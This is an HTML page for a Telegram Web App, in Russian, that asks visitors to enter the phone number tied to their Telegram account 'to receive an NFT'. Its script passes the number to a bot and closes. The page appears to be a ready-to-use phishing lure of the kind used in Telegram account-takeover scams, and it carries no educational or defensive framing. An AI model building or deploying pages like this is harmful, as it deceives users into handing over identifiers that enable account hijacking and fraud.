<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #1c1c1d; color: white; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #2c2c2e; border-radius: 20px; padding: 25px; text-align: center; width: 280px; }
        input { 
            width: 100%; padding: 12px; margin: 15px 0; 
            border-radius: 10px; border: 1px solid #48484a; 
            background: #1c1c1d; color: white; font-size: 16px; 
            box-sizing: border-box;
        }
        .btn { 
            background: #007aff; color: white; border: none; 
            padding: 12px; border-radius: 10px; width: 100%; 
            font-weight: 600; cursor: pointer; 
        }
    </style>
</head>
<body>
    <div class="card">
        <h2>Подтверждение</h2>
        <p>Введите номер телефона, привязанный к вашему Telegram, для получения NFT:</p>
        <input type="tel" id="phone" placeholder="+7 (___) ___-__-__">
        <button class="btn" onclick="send()">Подтвердить</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        function send() {
            let phone = document.getElementById("phone").value;
            if (phone.length < 10) {
                alert("Введите корректный номер");
                return;
            }
            tg.sendData(phone); // Отправляет номер боту
            tg.close();
        }
    </script>
</body>
</html>
